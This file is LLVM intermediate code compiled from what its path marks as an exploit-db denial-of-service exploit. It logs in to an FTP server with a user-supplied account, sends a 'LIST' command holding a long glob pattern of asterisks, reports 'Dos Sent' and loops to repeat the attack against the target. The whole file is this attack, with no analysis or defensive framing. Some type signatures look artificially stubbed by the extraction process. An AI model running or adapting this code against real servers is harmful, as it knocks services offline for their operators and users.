; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_842.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_842.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i8*, %struct.TYPE_2__, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.hostent = type { i32, i32*, i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [7 x i8] c"h:u:p:\00", align 1
@EOF = common dso_local global i8 0, align 1
@optarg = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [19 x i8] c"unknown host '%s'\0A\00", align 1
@SERVER_PORT = common dso_local global i32 0, align 4
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [20 x i8] c"cannot open socket \00", align 1
@INADDR_ANY = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [29 x i8] c"%d: cannot bind port TCP %u\0A\00", align 1
@.str.4 = private unnamed_addr constant [7 x i8] c"error \00", align 1
@.str.5 = private unnamed_addr constant [27 x i8] c"Trying To Connect To [%s]\0A\00", align 1
@.str.6 = private unnamed_addr constant [16 x i8] c"cannot connect \00", align 1
@.str.7 = private unnamed_addr constant [24 x i8] c"Trying Login With [%s]\0A\00", align 1
@.str.8 = private unnamed_addr constant [10 x i8] c"USER %s\0D\0A\00", align 1
@.str.9 = private unnamed_addr constant [4 x i8] c"331\00", align 1
@.str.10 = private unnamed_addr constant [4 x i8] c"421\00", align 1
@.str.11 = private unnamed_addr constant [30 x i8] c"Access Denied on your arse..\0A\00", align 1
@.str.12 = private unnamed_addr constant [21 x i8] c"Sending Pass - [%s]\0A\00", align 1
@.str.13 = private unnamed_addr constant [10 x i8] c"PASS %s\0D\0A\00", align 1
@.str.14 = private unnamed_addr constant [4 x i8] c"230\00", align 1
@.str.15 = private unnamed_addr constant [4 x i8] c"530\00", align 1
@.str.16 = private unnamed_addr constant [33 x i8] c"Access Denied: Login Incorrect!\0A\00", align 1
@.str.17 = private unnamed_addr constant [201 x i8] c"LIST ***********************************************************************************************************************************************************************************************.*\0D\0A\00", align 1
@.str.18 = private unnamed_addr constant [10 x i8] c"Dos Sent\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [1000 x i8], align 16
  %7 = alloca [255 x i8], align 16
  %8 = alloca [255 x i8], align 16
  %9 = alloca [255 x i8], align 16
  %10 = alloca i8, align 1
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.sockaddr_in, align 8
  %15 = alloca %struct.sockaddr_in, align 8
  %16 = alloca %struct.hostent*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %13, align 4
  %17 = load i32, i32* %4, align 4
  %18 = icmp slt i32 %17, 3
  br i1 %18, label %19, label %24

19:                                               ; preds = %2
  %20 = load i8**, i8*** %5, align 8
  %21 = getelementptr inbounds i8*, i8** %20, i64 0
  %22 = load i8*, i8** %21, align 8
  %23 = call i32 @usage(i8* %22)
  br label %24

24:                                               ; preds = %19, %2
  br label %25

25:                                               ; preds = %48, %24
  %26 = load i32, i32* %4, align 4
  %27 = load i8**, i8*** %5, align 8
  %28 = call signext i8 @getopt(i32 %26, i8** %27, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0))
  store i8 %28, i8* %10, align 1
  %29 = sext i8 %28 to i32
  %30 = load i8, i8* @EOF, align 1
  %31 = sext i8 %30 to i32
  %32 = icmp ne i32 %29, %31
  br i1 %32, label %33, label %49

33:                                               ; preds = %25
  %34 = load i8, i8* %10, align 1
  %35 = sext i8 %34 to i32
  switch i32 %35, label %48 [
    i32 104, label %36
    i32 117, label %40
    i32 112, label %44
  ]

36:                                               ; preds = %33
  %37 = getelementptr inbounds [255 x i8], [255 x i8]* %7, i64 0, i64 0
  %38 = load i32, i32* @optarg, align 4
  %39 = call i32 @strncpy(i8* %37, i32 %38, i32 255)
  br label %48

40:                                               ; preds = %33
  %41 = getelementptr inbounds [255 x i8], [255 x i8]* %8, i64 0, i64 0
  %42 = load i32, i32* @optarg, align 4
  %43 = call i32 @strncpy(i8* %41, i32 %42, i32 255)
  br label %48

44:                                               ; preds = %33
  %45 = getelementptr inbounds [255 x i8], [255 x i8]* %9, i64 0, i64 0
  %46 = load i32, i32* @optarg, align 4
  %47 = call i32 @strncpy(i8* %45, i32 %46, i32 255)
  br label %48

48:                                               ; preds = %33, %44, %40, %36
  br label %25

49:                                               ; preds = %25
  br label %50

50:                                               ; preds = %49, %183
  %51 = getelementptr inbounds [255 x i8], [255 x i8]* %7, i64 0, i64 0
  %52 = call %struct.hostent* @gethostbyname(i8* %51)
  store %struct.hostent* %52, %struct.hostent** %16, align 8
  %53 = load %struct.hostent*, %struct.hostent** %16, align 8
  %54 = icmp eq %struct.hostent* %53, null
  br i1 %54, label %55, label %59

55:                                               ; preds = %50
  %56 = getelementptr inbounds [255 x i8], [255 x i8]* %7, i64 0, i64 0
  %57 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.1, i64 0, i64 0), i8* %56)
  %58 = call i32 @exit(i32 1) #3
  unreachable

59:                                               ; preds = %50
  %60 = load %struct.hostent*, %struct.hostent** %16, align 8
  %61 = getelementptr inbounds %struct.hostent, %struct.hostent* %60, i32 0, i32 2
  %62 = load i32, i32* %61, align 8
  %63 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %15, i32 0, i32 2
  store i32 %62, i32* %63, align 4
  %64 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %15, i32 0, i32 1
  %65 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %64, i32 0, i32 0
  %66 = bitcast i32* %65 to i8*
  %67 = load %struct.hostent*, %struct.hostent** %16, align 8
  %68 = getelementptr inbounds %struct.hostent, %struct.hostent* %67, i32 0, i32 1
  %69 = load i32*, i32** %68, align 8
  %70 = getelementptr inbounds i32, i32* %69, i64 0
  %71 = load i32, i32* %70, align 4
  %72 = load %struct.hostent*, %struct.hostent** %16, align 8
  %73 = getelementptr inbounds %struct.hostent, %struct.hostent* %72, i32 0, i32 0
  %74 = load i32, i32* %73, align 8
  %75 = call i32 @memcpy(i8* %66, i32 %71, i32 %74)
  %76 = load i32, i32* @SERVER_PORT, align 4
  %77 = call i8* @htons(i32 %76)
  %78 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %15, i32 0, i32 0
  store i8* %77, i8** %78, align 8
  %79 = load i32, i32* @AF_INET, align 4
  %80 = load i32, i32* @SOCK_STREAM, align 4
  %81 = call i32 @socket(i32 %79, i32 %80, i32 0)
  store i32 %81, i32* %11, align 4
  %82 = load i32, i32* %11, align 4
  %83 = icmp slt i32 %82, 0
  br i1 %83, label %84, label %87

84:                                               ; preds = %59
  %85 = call i32 @perror(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.2, i64 0, i64 0))
  %86 = call i32 @exit(i32 1) #3
  unreachable

87:                                               ; preds = %59
  %88 = load i32, i32* @AF_INET, align 4
  %89 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 2
  store i32 %88, i32* %89, align 4
  %90 = load i32, i32* @INADDR_ANY, align 4
  %91 = call i32 @htonl(i32 %90)
  %92 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 1
  %93 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %92, i32 0, i32 0
  store i32 %91, i32* %93, align 8
  %94 = call i8* @htons(i32 0)
  %95 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %14, i32 0, i32 0
  store i8* %94, i8** %95, align 8
  %96 = load i32, i32* %11, align 4
  %97 = bitcast %struct.sockaddr_in* %14 to %struct.sockaddr*
  %98 = call i32 @bind(i32 %96, %struct.sockaddr* %97, i32 16)
  store i32 %98, i32* %12, align 4
  %99 = load i32, i32* %12, align 4
  %100 = icmp slt i32 %99, 0
  br i1 %100, label %101, label %107

101:                                              ; preds = %87
  %102 = load i32, i32* %11, align 4
  %103 = load i32, i32* @SERVER_PORT, align 4
  %104 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.3, i64 0, i64 0), i32 %102, i32 %103)
  %105 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i64 0, i64 0))
  %106 = call i32 @exit(i32 1) #3
  unreachable

107:                                              ; preds = %87
  %108 = getelementptr inbounds [255 x i8], [255 x i8]* %7, i64 0, i64 0
  %109 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.5, i64 0, i64 0), i8* %108)
  %110 = load i32, i32* %11, align 4
  %111 = bitcast %struct.sockaddr_in* %15 to %struct.sockaddr*
  %112 = call i32 @connect(i32 %110, %struct.sockaddr* %111, i32 16)
  store i32 %112, i32* %12, align 4
  %113 = load i32, i32* %12, align 4
  %114 = icmp slt i32 %113, 0
  br i1 %114, label %115, label %118

115:                                              ; preds = %107
  %116 = call i32 @perror(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.6, i64 0, i64 0))
  %117 = call i32 @exit(i32 1) #3
  unreachable

118:                                              ; preds = %107
  %119 = getelementptr inbounds [255 x i8], [255 x i8]* %8, i64 0, i64 0
  %120 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.7, i64 0, i64 0), i8* %119)
  %121 = getelementptr inbounds [1000 x i8], [1000 x i8]* %6, i64 0, i64 0
  %122 = getelementptr inbounds [255 x i8], [255 x i8]* %8, i64 0, i64 0
  %123 = call i32 (i8*, i32, i8*, ...) @snprintf(i8* %121, i32 1000, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i64 0, i64 0), i8* %122)
  %124 = load i32, i32* %11, align 4
  %125 = getelementptr inbounds [1000 x i8], [1000 x i8]* %6, i64 0, i64 0
  %126 = getelementptr inbounds [1000 x i8], [1000 x i8]* %6, i64 0, i64 0
  %127 = call i32 @strlen(i8* %126)
  %128 = call i32 @send(i32 %124, i8* %125, i32 %127, i32 0)
  store i32 %128, i32* %12, align 4
  %129 = getelementptr inbounds [1000 x i8], [1000 x i8]* %6, i64 0, i64 0
  %130 = call i32 @memset(i8* %129, i32 0, i32 1000)
  br label %131

131:                                              ; preds = %118, %146
  %132 = load i32, i32* %11, align 4
  %133 = getelementptr inbounds [1000 x i8], [1000 x i8]* %6, i64 0, i64 0
  %134 = call i32 @recv(i32 %132, i8* %133, i32 1000, i32 0)
  store i32 %134, i32* %12, align 4
  %135 = getelementptr inbounds [1000 x i8], [1000 x i8]* %6, i64 0, i64 0
  %136 = call i64 @strstr(i8* %135, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.9, i64 0, i64 0))
  %137 = icmp ne i64 %136, 0
  br i1 %137, label %138, label %139

138:                                              ; preds = %131
  br label %147

139:                                              ; preds = %131
  %140 = getelementptr inbounds [1000 x i8], [1000 x i8]* %6, i64 0, i64 0
  %141 = call i64 @strstr(i8* %140, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.10, i64 0, i64 0))
  %142 = icmp ne i64 %141, 0
  br i1 %142, label %143, label %146

143:                                              ; preds = %139
  %144 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.11, i64 0, i64 0))
  %145 = call i32 @exit(i32 0) #3
  unreachable

146:                                              ; preds = %139
  br label %131

147:                                              ; preds = %138
  %148 = getelementptr inbounds [255 x i8], [255 x i8]* %9, i64 0, i64 0
  %149 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.12, i64 0, i64 0), i8* %148)
  %150 = getelementptr inbounds [1000 x i8], [1000 x i8]* %6, i64 0, i64 0
  %151 = call i32 @memset(i8* %150, i32 0, i32 1000)
  %152 = getelementptr inbounds [1000 x i8], [1000 x i8]* %6, i64 0, i64 0
  %153 = getelementptr inbounds [255 x i8], [255 x i8]* %9, i64 0, i64 0
  %154 = call i32 (i8*, i32, i8*, ...) @snprintf(i8* %152, i32 1000, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.13, i64 0, i64 0), i8* %153)
  %155 = load i32, i32* %11, align 4
  %156 = getelementptr inbounds [1000 x i8], [1000 x i8]* %6, i64 0, i64 0
  %157 = getelementptr inbounds [1000 x i8], [1000 x i8]* %6, i64 0, i64 0
  %158 = call i32 @strlen(i8* %157)
  %159 = call i32 @send(i32 %155, i8* %156, i32 %158, i32 0)
  store i32 %159, i32* %12, align 4
  br label %160

160:                                              ; preds = %147, %182
  %161 = load i32, i32* %11, align 4
  %162 = getelementptr inbounds [1000 x i8], [1000 x i8]* %6, i64 0, i64 0
  %163 = call i32 @recv(i32 %161, i8* %162, i32 1000, i32 0)
  store i32 %163, i32* %12, align 4
  %164 = getelementptr inbounds [1000 x i8], [1000 x i8]* %6, i64 0, i64 0
  %165 = call i64 @strstr(i8* %164, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.14, i64 0, i64 0))
  %166 = icmp ne i64 %165, 0
  br i1 %166, label %167, label %168

167:                                              ; preds = %160
  br label %183

168:                                              ; preds = %160
  %169 = getelementptr inbounds [1000 x i8], [1000 x i8]* %6, i64 0, i64 0
  %170 = call i64 @strstr(i8* %169, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.10, i64 0, i64 0))
  %171 = icmp ne i64 %170, 0
  br i1 %171, label %172, label %175

172:                                              ; preds = %168
  %173 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.11, i64 0, i64 0))
  %174 = call i32 @exit(i32 0) #3
  unreachable

175:                                              ; preds = %168
  %176 = getelementptr inbounds [1000 x i8], [1000 x i8]* %6, i64 0, i64 0
  %177 = call i64 @strstr(i8* %176, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.15, i64 0, i64 0))
  %178 = icmp ne i64 %177, 0
  br i1 %178, label %179, label %182

179:                                              ; preds = %175
  %180 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.16, i64 0, i64 0))
  %181 = call i32 @exit(i32 0) #3
  unreachable

182:                                              ; preds = %175
  br label %160

183:                                              ; preds = %167
  %184 = getelementptr inbounds [1000 x i8], [1000 x i8]* %6, i64 0, i64 0
  %185 = call i32 @memset(i8* %184, i32 0, i32 1000)
  %186 = getelementptr inbounds [1000 x i8], [1000 x i8]* %6, i64 0, i64 0
  %187 = call i32 (i8*, i32, i8*, ...) @snprintf(i8* %186, i32 1000, i8* getelementptr inbounds ([201 x i8], [201 x i8]* @.str.17, i64 0, i64 0))
  %188 = load i32, i32* %11, align 4
  %189 = getelementptr inbounds [1000 x i8], [1000 x i8]* %6, i64 0, i64 0
  %190 = getelementptr inbounds [1000 x i8], [1000 x i8]* %6, i64 0, i64 0
  %191 = call i32 @strlen(i8* %190)
  %192 = call i32 @send(i32 %188, i8* %189, i32 %191, i32 0)
  store i32 %192, i32* %12, align 4
  %193 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.18, i64 0, i64 0))
  br label %50
}

declare dso_local i32 @usage(i8*) #1

declare dso_local signext i8 @getopt(i32, i8**, i8*) #1

declare dso_local i32 @strncpy(i8*, i32, i32) #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #1

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @memcpy(i8*, i32, i32) #1

declare dso_local i8* @htons(i32) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @htonl(i32) #1

declare dso_local i32 @bind(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @snprintf(i8*, i32, i8*, ...) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @recv(i32, i8*, i32, i32) #1

declare dso_local i64 @strstr(i8*, i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
